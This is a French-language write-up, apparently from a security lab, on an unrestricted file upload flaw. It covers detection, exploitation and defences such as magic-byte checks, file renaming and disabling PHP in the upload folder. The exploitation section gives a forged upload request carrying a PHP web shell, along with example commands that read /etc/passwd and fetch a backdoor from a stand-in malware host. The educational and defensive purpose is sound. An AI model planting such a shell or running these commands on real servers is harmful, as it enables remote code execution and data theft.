# Faille : Upload de fichier non sécurisé (File Upload Vulnerability)

## Description de la faille

Le formulaire d'upload présente une vulnérabilité de type **Unrestricted File Upload** avec validation côté client/serveur insuffisante.

### Code vulnérable

```html
<form enctype="multipart/form-data" action="#" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="100000">
    Choose an image to upload:
    <br>
    <input name="uploaded" type="file"><br>
    <br>
    <input type="submit" name="Upload" value="Upload">
</form>
```

## Comment détecter la faille

1. **Observation du formulaire** : Le formulaire accepte uniquement les fichiers JPG/JPEG
2. **Vérification superficielle** : La validation se fait probablement uniquement sur :
   - L'extension du fichier
   - Le Content-Type HTTP
3. **Absence de validation robuste** : Pas de vérification du contenu réel du fichier (magic bytes, contenu)

### Indicateurs de la vulnérabilité

- Le serveur ne vérifie que le **Content-Type** envoyé dans la requête HTTP
- Le serveur ne vérifie que l'**extension** du fichier
- Aucune validation du contenu réel du fichier (signature binaire)
- Absence de liste blanche stricte des types MIME

## Exploitation de la faille

### Requête normale (fichier JPEG légitime)

```http
------geckoformboundaryfb6b0eeebc93c1cd4d3216d3a300a5b9
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------geckoformboundaryfb6b0eeebc93c1cd4d3216d3a300a5b9
Content-Disposition: form-data; name="uploaded"; filename="test2.jpg"
Content-Type: image/jpeg

[binary data of actual JPEG image]
------geckoformboundaryfb6b0eeebc93c1cd4d3216d3a300a5b9
Content-Disposition: form-data; name="Upload"

Upload
------geckoformboundaryfb6b0eeebc93c1cd4d3216d3a300a5b9--
```

Cette requête est **acceptée** car :
- Le `filename` a l'extension `.jpg`
- Le `Content-Type` est `image/jpeg`
- Le contenu est réellement une image JPEG

### Exploitation (contourner la validation)

**Étape 1 : Intercepter la requête**
- Utiliser un proxy comme Burp Suite, OWASP ZAP, ou les DevTools du navigateur
- Capturer la requête POST lors de l'upload

**Étape 2 : Modifier la requête malveillante**

```http
------geckoformboundary86121e6bc26c2afecaf3abc4e6c7e3c4
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------geckoformboundary86121e6bc26c2afecaf3abc4e6c7e3c4
Content-Disposition: form-data; name="uploaded"; filename="script.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------geckoformboundary86121e6bc26c2afecaf3abc4e6c7e3c4
Content-Disposition: form-data; name="Upload"

Upload
------geckoformboundary86121e6bc26c2afecaf3abc4e6c7e3c4--
```

**Paramètres modifiés :**
- `filename`: `"script.php"` (extension PHP au lieu de .jpg)
- `Content-Type`: `image/jpeg` (MIME type trompeur pour contourner la validation)
- **Contenu**: Code PHP malveillant au lieu de données binaires d'image

**La faille :** Le serveur fait confiance au `Content-Type` envoyé par le client sans vérifier le contenu réel

**Étape 3 : Upload et exécution**

Une fois uploadé, le fichier `script.php` peut être exécuté par le serveur si :
- Il est placé dans un répertoire accessible
- Le serveur exécute les fichiers PHP

### Exemples concrets de scripts malveillants

#### 1. Web Shell simple (Commande système)

```php
<?php
// Fichier: shell.php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

**Usage:** `http://localhost:8080/uploads/shell.php?cmd=ls -la`

**Impact:** Exécution de n'importe quelle commande système : 
- `ls -la` : Lister les fichiers
- `cat /etc/passwd` : Lire des fichiers sensibles
- `whoami` : Identifier l'utilisateur courant
- `wget malware.com/backdoor.sh` : Télécharger d'autres malwares

## Impact de la faille

### Risques :
1. **Remote Code Execution (RCE)** : Exécution de code arbitraire sur le serveur
2. **Defacement** : Modification du site web
3. **Backdoor** : Installation d'une porte dérobée
4. **Data Exfiltration** : Vol de données sensibles
5. **Lateral Movement** : Pivot vers d'autres systèmes du réseau


## Protection et prévention

### Protections essentielles

**1. Vérifier le contenu réel du fichier (magic bytes)**
```php
// Pour JPEG : FF D8 FF
$handle = fopen($_FILES['uploaded']['tmp_name'], 'rb');
$header = fread($handle, 3);
if ($header !== "\xFF\xD8\xFF") {
    die("Not a valid JPEG");
}
```
Ne jamais faire confiance au Content-Type envoyé par le client.

**2. Renommer les fichiers uploadés**
```php
$newFilename = hash('sha256', uniqid()) . '.jpg';
```
Empêche l'exécution de scripts même si uploadés.

**3. Désactiver l'exécution de scripts dans le dossier d'upload**
```apache
# .htaccess dans le dossier d'upload
php_flag engine off
AddType text/plain .php .php3 .phtml
```
Dernier rempart : même si un script malveillant est uploadé, il ne sera pas exécuté.

